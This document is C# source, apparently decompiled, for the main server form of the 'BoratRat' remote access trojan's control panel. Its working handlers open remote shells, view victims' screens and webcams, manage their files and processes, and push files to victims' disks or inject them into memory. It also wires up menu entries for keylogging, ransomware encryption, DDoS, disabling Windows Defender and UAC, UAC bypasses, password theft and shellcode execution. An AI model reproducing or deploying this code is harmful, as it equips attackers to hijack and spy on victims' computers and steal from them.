// Server.Form1
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using DarkUI.Controls;
using DarkUI.Forms;
using Microsoft.VisualBasic;
using Server;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

public class Form1 : DarkForm
{
	private bool trans;

	public cGeoMain cGeoMain;

	public static List<AsyncTask> getTasks;

	private ListViewColumnSorter lvwColumnSorter;

	private readonly FormDOS formDOS;

	private IContainer components;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private System.Windows.Forms.Timer ping;

	private System.Windows.Forms.Timer UpdateUI;

	private PerformanceCounter performanceCounter1;

	private PerformanceCounter performanceCounter2;

	private ContextMenuStrip contextMenuThumbnail;

	private ToolStripMenuItem sTARTToolStripMenuItem;

	private ToolStripMenuItem sTOPToolStripMenuItem;

	public ImageList ThumbnailImageList;

	public NotifyIcon notifyIcon1;

	private ContextMenuStrip contextMenuTasks;

	private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

	private ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

	private ToolStripMenuItem uPDATEToolStripMenuItem1;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripMenuItem dELETETASKToolStripMenuItem;

	private System.Windows.Forms.Timer TimerTask;

	private ContextMenuStrip contextMenuLogs;

	private ToolStripMenuItem cLEARToolStripMenuItem;

	private ToolStripStatusLabel toolStripStatusLabel2;

	private ContextMenuStrip contextMenuClient;

	private ToolStripMenuItem RemoteManagerToolStripMenuItem;

	private ToolStripMenuItem RemoteShellToolStripMenuItem;

	private ToolStripMenuItem RemoteScreenToolStripMenuItem;

	private ToolStripMenuItem RemoteCameraToolStripMenuItem;

	private ToolStripMenuItem FileManagerToolStripMenuItem1;

	private ToolStripMenuItem ProcessManagerToolStripMenuItem;

	private ToolStripMenuItem ProgramNotificationToolStripMenuItem;

	private ToolStripMenuItem RemoteControlToolStripMenuItem;

	private ToolStripMenuItem SendFileToolStripMenuItem1;

	private ToolStripMenuItem SendFileToDiskToolStripMenuItem;

	private ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

	private ToolStripMenuItem MessageBoxToolStripMenuItem;

	private ToolStripMenuItem ChatToolStripMenuItem1;

	private ToolStripMenuItem VisteWebsiteToolStripMenuItem1;

	private ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;

	private ToolStripMenuItem KeyloggerToolStripMenuItem1;

	private ToolStripMenuItem SystemControlToolStripMenuItem;

	private ToolStripMenuItem ClientControlToolStripMenuItem;

	private ToolStripMenuItem StopToolStripMenuItem1;

	private ToolStripMenuItem RestartToolStripMenuItem1;

	private ToolStripMenuItem UpdateToolStripMenuItem;

	private ToolStripMenuItem UninstallToolStripMenuItem;

	private ToolStripMenuItem ClientFolderToolStripMenuItem;

	private ToolStripMenuItem SystemToolStripMenuItem;

	private ToolStripMenuItem ShutDownToolStripMenuItem;

	private ToolStripMenuItem RebootToolStripMenuItem;

	private ToolStripMenuItem LogoutToolStripMenuItem;

	private ToolStripMenuItem BypassUACAToolStripMenuItem;

	private SplitContainer splitContainer1;

	private TabControl tabControl1;

	private TabPage tabPage1;

	public ListView listView1;

	private ColumnHeader lv_ip;

	private ColumnHeader lv_country;

	public ColumnHeader lv_hwid;

	private ColumnHeader lv_user;

	private ColumnHeader lv_os;

	private ColumnHeader lv_version;

	private ColumnHeader lv_ins;

	private ColumnHeader lv_admin;

	private ColumnHeader lv_av;

	public ColumnHeader lv_ping;

	public ColumnHeader lv_act;

	private TabPage tabPage3;

	public ListView listView3;

	private TabPage tabPage4;

	public ListView listView4;

	private ColumnHeader columnHeader4;

	private ColumnHeader columnHeader5;

	private ToolStripMenuItem FileToolStripMenuItem;

	private ToolStripMenuItem BuilderToolStripMenuItem;

	private ToolStripMenuItem StartToolStripMenuItem1;

	private ToolStripMenuItem StopToolStripMenuItem2;

	private ToolStripMenuItem BlockToolStripMenuItem;

	private ToolStripMenuItem FileSearchToolStripMenuItem;

	private ColumnHeader lv_group;

	private ToolStripMenuItem InformationToolStripMenuItem;

	private ToolStripMenuItem MalwareToolStripMenuItem;

	private ToolStripMenuItem dDOSToolStripMenuItem;

	private ToolStripMenuItem RansomwareToolStripMenuItem;

	private ToolStripMenuItem EncryptToolStripMenuItem;

	private ToolStripMenuItem DecryptToolStripMenuItem;

	private ToolStripMenuItem DisableWDToolStripMenuItem;

	private ToolStripMenuItem RecordToolStripMenuItem;

	private ToolStripMenuItem SilentCleanupToolStripMenuItem;

	private ToolStripMenuItem RunasToolStripMenuItem;

	private ToolStripMenuItem InstallToolStripMenuItem;

	private ToolStripMenuItem SchtaskInstallToolStripMenuItem;

	private ToolStripMenuItem PasswordRecoveryToolStripMenuItem;

	private ToolStripMenuItem FodhelperToolStripMenuItem;

	private ToolStripMenuItem DisableUACToolStripMenuItem;

	private ToolStripMenuItem CompMgmtLauncherToolStripMenuItem;

	private ToolStripMenuItem autoKeyloggerToolStripMenuItem;

	private ToolStripMenuItem SchtaskUninstallToolStripMenuItem;

	private ColumnHeader lv_camera;

	private ToolStripMenuItem fakeBinderToolStripMenuItem;

	private ToolStripMenuItem netstatToolStripMenuItem;

	private ToolStripMenuItem fromUrlToolStripMenuItem;

	private ToolStripMenuItem sendFileFromUrlToolStripMenuItem;

	private ToolStripMenuItem installSchtaskToolStripMenuItem;

	private ToolStripMenuItem disableUACToolStripMenuItem1;

	private ToolStripMenuItem disableWDToolStripMenuItem1;

	private System.Windows.Forms.Timer ConnectTimeout;

	private ToolStripMenuItem remoteRegeditToolStripMenuItem;

	private ToolStripMenuItem normalInstallToolStripMenuItem;

	private ToolStripMenuItem normalUninstallToolStripMenuItem;

	private ToolStripMenuItem justForFunToolStripMenuItem;

	private ToolStripMenuItem runShellcodeToolStripMenuItem;

	private ToolStripMenuItem noSystemToolStripMenuItem;

	private ToolStripMenuItem DiscordRecoveryToolStripMenuItem;

	private DarkStatusStrip statusStrip1;

	private DarkMenuStrip menuStrip1;

	public ListView listView2;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	public Form1()
	{
		cGeoMain = new cGeoMain();
		InitializeComponent();
		SetWindowTheme(listView1.Handle, "explorer", null);
		base.Opacity = 0.0;
		formDOS = new FormDOS
		{
			Name = "DOS",
			Text = "DOS"
		};
	}

	private void CheckFiles()
	{
		try
		{
			if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
			{
				MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
				Environment.Exit(0);
			}
			if (!File.Exists(Path.Combine(Application.StartupPath, "bin\\ip2region.db")))
			{
				File.WriteAllBytes(Path.Combine(Application.StartupPath, "bin\\ip2region.db"), Resources.ip2region);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "BoratRat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private Clients[] GetSelectedClients()
	{
		List<Clients> clientsList = new List<Clients>();
		Invoke((MethodInvoker)delegate
		{
			lock (Server.Settings.LockListviewClients)
			{
				if (listView1.SelectedItems.Count == 0)
				{
					return;
				}
				foreach (ListViewItem selectedItem in listView1.SelectedItems)
				{
					clientsList.Add((Clients)selectedItem.Tag);
				}
			}
		});
		return clientsList.ToArray();
	}

	private Clients[] GetAllClients()
	{
		List<Clients> clientsList = new List<Clients>();
		Invoke((MethodInvoker)delegate
		{
			lock (Server.Settings.LockListviewClients)
			{
				if (listView1.Items.Count == 0)
				{
					return;
				}
				foreach (ListViewItem item in listView1.Items)
				{
					clientsList.Add((Clients)item.Tag);
				}
			}
		});
		return clientsList.ToArray();
	}

	private async void Connect()
	{
		try
		{
			await Task.Delay(1000);
			string[] array = Server.Properties.Settings.Default.Ports.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Thread thread = new Thread(new Listener().Connect);
					thread.IsBackground = true;
					thread.Start(Convert.ToInt32(text.ToString().Trim()));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
			Environment.Exit(0);
		}
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		ListviewDoubleBuffer.Enable(listView1);
		ListviewDoubleBuffer.Enable(listView2);
		ListviewDoubleBuffer.Enable(listView3);
		try
		{
			string[] array = Server.Properties.Settings.Default.txtBlocked.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Server.Settings.Blocked.Add(text);
				}
			}
		}
		catch
		{
		}
		CheckFiles();
		lvwColumnSorter = new ListViewColumnSorter();
		listView1.ListViewItemSorter = lvwColumnSorter;
		using (FormPorts formPorts = new FormPorts())
		{
			formPorts.ShowDialog();
		}
		await Methods.FadeIn(this, 5);
		trans = true;
		if (Server.Properties.Settings.Default.Notification)
		{
			toolStripStatusLabel2.ForeColor = Color.Green;
		}
		else
		{
			toolStripStatusLabel2.ForeColor = Color.Black;
		}
		new Thread((ThreadStart)delegate
		{
			Connect();
		}).Start();
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
		if (trans)
		{
			base.Opacity = 1.0;
		}
	}

	private void Form1_Deactivate(object sender, EventArgs e)
	{
		base.Opacity = 0.95;
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		notifyIcon1.Dispose();
		Environment.Exit(0);
	}

	private void listView1_KeyDown(object sender, KeyEventArgs e)
	{
		if (listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
		{
			return;
		}
		foreach (ListViewItem item in listView1.Items)
		{
			item.Selected = true;
		}
	}

	private void listView1_MouseMove(object sender, MouseEventArgs e)
	{
		if (listView1.Items.Count > 1)
		{
			ListViewHitTestInfo listViewHitTestInfo = listView1.HitTest(e.Location);
			if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
			{
				listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
			}
		}
	}

	private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		if (e.Column == lvwColumnSorter.SortColumn)
		{
			if (lvwColumnSorter.Order == SortOrder.Ascending)
			{
				lvwColumnSorter.Order = SortOrder.Descending;
			}
			else
			{
				lvwColumnSorter.Order = SortOrder.Ascending;
			}
		}
		else
		{
			lvwColumnSorter.SortColumn = e.Column;
			lvwColumnSorter.Order = SortOrder.Ascending;
		}
		listView1.Sort();
	}

	private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
	{
		if (Server.Properties.Settings.Default.Notification)
		{
			Server.Properties.Settings.Default.Notification = false;
			toolStripStatusLabel2.ForeColor = Color.Black;
		}
		else
		{
			Server.Properties.Settings.Default.Notification = true;
			toolStripStatusLabel2.ForeColor = Color.Green;
		}
		Server.Properties.Settings.Default.Save();
	}

	private void ping_Tick(object sender, EventArgs e)
	{
		if (listView1.Items.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
			msgPack.ForcePathObject("Message").AsString = "This is a ping!";
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack.Encode2Bytes());
			}
			GC.Collect();
		}
	}

	private void UpdateUI_Tick(object sender, EventArgs e)
	{
		Text = Server.Settings.Version + "     " + DateTime.Now.ToLongTimeString();
		lock (Server.Settings.LockListviewClients)
		{
			toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Server.Settings.SentValue).ToString()}     Received  {Methods.BytesToString(Server.Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     Memory {(int)performanceCounter2.NextValue()}%";
		}
	}

	private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			lock (Server.Settings.LockListviewLogs)
			{
				listView2.Items.Clear();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.Items.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
	}

	private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
				foreach (ListViewItem item in listView3.Items)
				{
					ThreadPool.QueueUserWorkItem(((Clients)item.Tag).Send, msgPack.Encode2Bytes());
				}
			}
			listView3.Items.Clear();
			ThumbnailImageList.Images.Clear();
			foreach (ListViewItem item2 in listView1.Items)
			{
				((Clients)item2.Tag).LV2 = null;
			}
		}
		catch
		{
		}
	}

	private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView4.SelectedItems.Count <= 0)
		{
			return;
		}
		foreach (ListViewItem selectedItem in listView4.SelectedItems)
		{
			selectedItem.Remove();
		}
	}

	private async void TimerTask_Tick(object sender, EventArgs e)
	{
		try
		{
			Clients[] clients = GetAllClients();
			if (getTasks.Count <= 0 || clients.Length == 0)
			{
				return;
			}
			foreach (AsyncTask item in getTasks.ToList())
			{
				if (!GetListview(item.id))
				{
					getTasks.Remove(item);
					return;
				}
				Clients[] array = clients;
				foreach (Clients clients2 in array)
				{
					if (!item.doneClient.Contains(clients2.ID))
					{
						if (clients2.Admin)
						{
							item.doneClient.Add(clients2.ID);
							SetExecution(item.id);
							ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
						}
						else if (!clients2.Admin && !item.admin)
						{
							item.doneClient.Add(clients2.ID);
							SetExecution(item.id);
							ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
						}
					}
				}
				await Task.Delay(15000);
			}
		}
		catch
		{
		}
	}

	private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
			msgPack.ForcePathObject("Update").AsString = "false";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			formSendFileToMemory.ShowDialog();
			if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
			msgPack.ForcePathObject("Update").AsString = "true";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private bool GetListview(string id)
	{
		foreach (ListViewItem item in Program.form1.listView4.Items)
		{
			if (item.ToolTipText == id)
			{
				return true;
			}
		}
		return false;
	}

	private void SetExecution(string id)
	{
		foreach (ListViewItem item in Program.form1.listView4.Items)
		{
			if (item.ToolTipText == id)
			{
				int num = Convert.ToInt32(item.SubItems[1].Text);
				item.SubItems[1].Text = (num + 1).ToString();
			}
		}
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		using FormBuilder formBuilder = new FormBuilder();
		formBuilder.ShowDialog();
	}

	private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		using FormAbout formAbout = new FormAbout();
		formAbout.ShowDialog();
	}

	private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shell";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
				{
					FormShell formShell = new FormShell();
					formShell.Name = "shell:" + clients.ID;
					formShell.Text = "shell:" + clients.ID;
					formShell.F = this;
					formShell.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\RemoteDesktop.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
				{
					FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
					formRemoteDesktop.Name = "RemoteDesktop:" + clients.ID;
					formRemoteDesktop.F = this;
					formRemoteDesktop.Text = "RemoteDesktop:" + clients.ID;
					formRemoteDesktop.ParentClient = clients;
					formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop");
					formRemoteDesktop.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\RemoteCamera.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
				{
					FormWebcam formWebcam = new FormWebcam();
					formWebcam.Name = "Webcam:" + clients.ID;
					formWebcam.F = this;
					formWebcam.Text = "Webcam:" + clients.ID;
					formWebcam.ParentClient = clients;
					formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera");
					formWebcam.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\FileManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
				{
					FormFileManager formFileManager = new FormFileManager();
					formFileManager.Name = "fileManager:" + clients.ID;
					formFileManager.Text = "fileManager:" + clients.ID;
					formFileManager.F = this;
					formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID);
					formFileManager.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\ProcessManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
				{
					FormProcessManager formProcessManager = new FormProcessManager();
					formProcessManager.Name = "processManager:" + clients.ID;
					formProcessManager.Text = "processManager:" + clients.ID;
					formProcessManager.F = this;
					formProcessManager.ParentClient = clients;
					formProcessManager.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack packet = new MsgPack();
			packet.ForcePathObject("Pac_ket").AsString = "sendFile";
			packet.ForcePathObject("Update").AsString = "false";
			MsgPack msgpack = new MsgPack();
			msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients client in selectedClients)
			{
				client.LV.ForeColor = Color.Red;
				string[] fileNames = openFileDialog.FileNames;
				foreach (string file in fileNames)
				{
					await Task.Run(delegate
					{
						packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
						packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
						msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
					});
					ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			formSendFileToMemory.ShowDialog();
			if (formSendFileToMemory.IsOK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					clients.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Message", "Message", "Controlled by BoratRat");
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
				msgPack.ForcePathObject("Message").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com");
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
				msgPack.ForcePathObject("URL").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

